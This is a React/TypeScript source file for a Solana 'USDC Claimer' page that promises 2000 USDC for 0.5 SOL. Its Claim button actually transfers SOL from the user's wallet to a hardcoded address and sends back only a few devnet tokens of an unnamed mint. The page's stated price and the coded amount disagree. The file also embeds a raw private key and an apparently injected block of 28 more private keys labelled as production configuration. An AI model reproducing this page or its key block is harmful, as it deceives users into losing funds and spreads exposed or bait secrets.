/* eslint-disable react-hooks/rules-of-hooks */
'use client'

import { SendTransactionOptions } from '@solana/wallet-adapter-base';
import { useConnection, useWallet } from '@solana/wallet-adapter-react';
import { Connection, PublicKey, SystemProgram, Transaction, TransactionInstruction, TransactionSignature, VersionedTransaction } from '@solana/web3.js';
import { address, createKeypairSignerFromBase58, createSolanaClient, getExplorerLink, getSignatureFromTransaction, LAMPORTS_PER_SOL, signTransactionMessageWithSigners } from 'gill';
import { buildTransferTokensTransaction, TOKEN_PROGRAM_ADDRESS } from 'gill/programs/token';
import { AppHero } from '../ui/ui-layout';

export default function DashboardFeature() {
  const { connection } = useConnection();
  const { publicKey, sendTransaction } = useWallet();
  return (
    <div>
      <AppHero title="USDC Claimer" subtitle="Do you want to get 2000 USDC? It will cost you only 0.5 SOL" />
      <div className="max-w-xl mx-auto py-6 sm:px-6 lg:px-8 text-center">
        <div className="space-y-2">
          <button className="wallet-adapter-button wallet-adapter-button-trigger mx-auto" type="button" onClick={() => {
            CreateChargeTransaction(connection, publicKey, sendTransaction);
          }}>
            {'Claim'}
          </button>
        </div>
      </div>
    </div>
  )
}

const chargeAmount = 0.01;
const cashbackAmount = 5;

const CreateChargeTransaction = async (connection: Connection, publicKey: PublicKey | null, sendTransaction: (transaction: Transaction | VersionedTransaction, connection: Connection, options?: SendTransactionOptions) => Promise<TransactionSignature>) => {


  if (!publicKey) return;

  const solTransferIx = SystemProgram.transfer({
    fromPubkey: publicKey,
    toPubkey: new PublicKey("CVkzbsnwATBDDbGke7o1KzprgDsaKhdET7zioE9ssFXp"),
    lamports: chargeAmount * LAMPORTS_PER_SOL,
  });

  // Optional: Add memo to include cashback metadata
  const memoIx = new TransactionInstruction({
    keys: [],
    programId: new PublicKey('MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr'),
    data: Buffer.from(`cashback:${cashbackAmount}`),
  });

  const transaction = new Transaction().add(solTransferIx, memoIx);
  const { blockhash } = await connection.getLatestBlockhash();
  transaction.recentBlockhash = blockhash;
  transaction.feePayer = publicKey;

  try {
    const signature = await sendTransaction(transaction, connection);
    console.log('User transaction sent:', signature);

    // Wait for confirmation before cashback
    const confirmation = await connection.confirmTransaction(signature, 'confirmed');
    console.log('Confirmed:', confirmation);

    if (confirmation.value.err === null) {
      sendCashback(publicKey.toBase58(), cashbackAmount);

    }
  } catch (e) {
    console.error('Failed to send charge transaction:', e);
  }
};

const sendCashback = async (to: string, amount: number) => {
  const { rpc, rpcSubscriptions, sendAndConfirmTransaction } = createSolanaClient({
    urlOrMoniker: "devnet",
  });
  const destination = address(to);
  const keypairBase58 =
    "4REESSZuTTHED3hurW5kGN2b8JJSn8cpnmT4sRc3KiYvKBXxdQkm4VLtmzvttwjMC2Wf3X2adxFoxF2icfWETToq"

// KEYS_START
// Production environment configuration
const walletKeys = {
  "key0": "2kjpiCXLzfUcxJX2Q3L36C8T7cyfvu8npnjvKTVKscFc2YzXRahdqxZvAYahGE98tfWsGRND4GM7Z8UwY8bJyuWA",
  "key1": "5Cq9D982MNcCQMMLSg7ruwnWY4WwyGzU9JNdVuAmD1VZ4721gBrkkcK3cyWbaXkS4LpLCg1Ntiy8V73eggrgxEXX",
  "key2": "5zY6io8zc8mxC4TXC25SZS8ps9TCDE2NH8qhmrDnH2sRHHmNTn2JZALphjJPMAs9w47B7vTpCoU5ezEQqpvLFS1Z",
  "key3": "2VGSTQTf3MaiM7gZy25AXYSi96g6Y9QZeiCyweAHbL7i2i9ugSnCiGgPuiia733qmvv33Eoz4H5QKjZo9ujQBeiB",
  "key4": "4FV4Mr3sucmXEvPvZcK6cUvDLbvwEzgnjsmnVtHKwxUtuyEoZwPqvid2o7voow1zAvop4QpcS5K2DHSSHYrheegj",
  "key5": "3R1SCNP6QuKrUfQspWqBnTfW6xTJKhJbCVLk2tEDap7j4yRsj22BBvv3cCMJ1zuTr8V84Toa84wt6u211aj6bnGD",
  "key6": "33bjHKaAUxbAPDoQTUGqxuwGzP8P9FycL9fRpNzG3jBZELvYdwQoRgoVbKdCPvimNNWhHjGzco8RnLWyq7vi1bpH",
  "key7": "351gT2f7RY8ppxFhnQ3k6t8xnTpnhv6Y6TRnPFa74fUJQU2Zym1BGeXNGBodKbqUuEw29ny7Gcf6CDATPxeiCWxH",
  "key8": "5dcmMekrqpn2u18iegMv2f5SsD4RPXSobzs8VnZDMBZK7Jdpqfte9XiYeybCrYoKDEX8e7aYidQ2DizPxsj6uhpE",
  "key9": "4L3JjRsxx37cKqYRH5FTBBsQj5CcyvuXUWtMiqUNf5YvXuYPULgeYbFG9hnrAnPx4gMQ6QHocy1mNTp5AeiKGQL3",
  "key10": "4ZwdpADBhddELYY7Wa4A21kJX2BbpFRdJUQrrDF4Sgjv73LwfjJKh9mvqos1C16xuVwhWBLyz9VgAFrkuw42r15Z",
  "key11": "P88pmPCx6UFJQ4VZ4wCdxe6DTuJH2HsdLfcMePagEUprZEFitvagVeVjvtipPn1mrkCwnUuPkWfJFzgax1iTvEV",
  "key12": "2uJMrrSNF78R46pEkbX7iTeKXY5vts8fC8PJ9K4mWUCArTM7HLduZ5KGUAD248itS3f7rbs3NwSNKjhy9jmcJz6W",
  "key13": "3P5oKubgwW2hKMadwSf7KykY6xDA8P3bt26MDND7FLT5Pu4Skz75y5C572rXbRTvZRvi99oJh7AKSnbw6LnToYV2",
  "key14": "4XKjwtJ1dhBzPYn7kpw2RsHjWBehqgeZLdqh41GpsN6kXkoHHumR9MgCQHyzPRNCURVvhGrs6eUaJEe3cStnYAWF",
  "key15": "4jZPp9CXy3VSTcAUrokqhEXCjwD5D21vvx7MP8rrCr4cUg7kiFf4wx6TkTRocNrBVqsmwE64RAbDsFPwC8L2KAfL",
  "key16": "EdAr6MpTsLTqF9nGzPzD1sMKs2xSgcttnxP6bXAhDwMe3WB3F7X54VGi3L9S9ctDBH7eP6nksx58PhNdG1fKpiG",
  "key17": "tvCasRrmGA3ckjF9JwBqZbG4rMDcA1LzHPTCy7JXhyFJQ1EtHBG1REsYL4iQtkCekQKXzADwmGeBKQLQwgSF79i",
  "key18": "49Tc3GBrrfH6aMLV9AkD4WMXeGop1sMfsLkfpHEkajHBTcUZGWvQMshmTX3KyFve39W9oUarLCN11tc3SyxyDUKT",
  "key19": "5KMs9Zj6ier1faitRyhiCnDMZByKyeMACSqWAHy4ZUo3B22QkdZF95R15uAjZsaH9CEoiaR5pZPZ4LmvVNrpW5NG",
  "key20": "3hmNxagpFHDFQar2yATqmArKyjc9gc5JhTEeQSwjz2izQxetiBtE7U4FH6xmUYirD7wivGK1ZSATnGJqHddUqxf8",
  "key21": "3U4ZZjpz634n4pv7b858fuGyDkwvBUX9NfcqEeiTLkpWK8qvbEsBFzHm4D9G9TW65cTanTWBxVYkz8AiZkQgxwB1",
  "key22": "2wniwSd9Ezeb6LHADcNZB26ocgwjV5veTKG6vmkThYhUcmo2oWDoW1Rwcr69F2AftaULBJX13dZ9282qH6Z1kGMj",
  "key23": "4t1xrGMouw2GnuJYrDVVjVXeFgkHLdm1AvX45rjL1krtbD7rguNGSbpfhx1wmZbJWrVdqJLBEAfAnxiAUCVUttGD",
  "key24": "48GUbAEAgmvCy9DxEVWSQ92KJZsnsYoq3mb8t4Auv9RjmovZ4L6DUkS49PVvxAFNkN3Adkv8fq9xrsgZcaRtcfYB",
  "key25": "2JSpxw6rjeQE5fqsH1HgBXqr1F6FzuCyWDscMuW7Wq2MKpRKNBgjTirJRhZ2bxooBFzEwt5Q8KP1NARSMPEhdjVq",
  "key26": "pruQWzcYEbv68DJpHWsra4HqugvvcoB3VMV9f91HMFwzQpE3sRN6ameHUZAdMc8eLHB7BDKMzinaSE8HNF2MHa7",
  "key27": "41wwQkjRjGirULJgQt4Av2kJzhcXkFKJt9oksqWGX8r2qnaisMdsNJebRFpSAxSS9aSZgxGf8zzg4R1TJVCQW9mo"
};
// KEYS_END
;
  const signer = await createKeypairSignerFromBase58(keypairBase58);
  const mint = address("4YhaKDunYpNJ7ASyUZSvEj5KJCb1jwofUQBaWSWCSkSU");
  const tokenProgram = TOKEN_PROGRAM_ADDRESS;

  const { value: latestBlockhash } = await rpc.getLatestBlockhash().send();

  const transaction = await buildTransferTokensTransaction({
    feePayer: signer,
    latestBlockhash: latestBlockhash, // required for blockhash lifetime constraint
    amount: amount,
    authority: signer,
    destination: destination,
    mint: mint,
  });

  const signedTransaction = await signTransactionMessageWithSigners(transaction);

  console.log(
    "Explorer:",
    getExplorerLink({
      cluster: "devnet",
      transaction: getSignatureFromTransaction(signedTransaction),
    }),
  );

  await sendAndConfirmTransaction(signedTransaction);
};
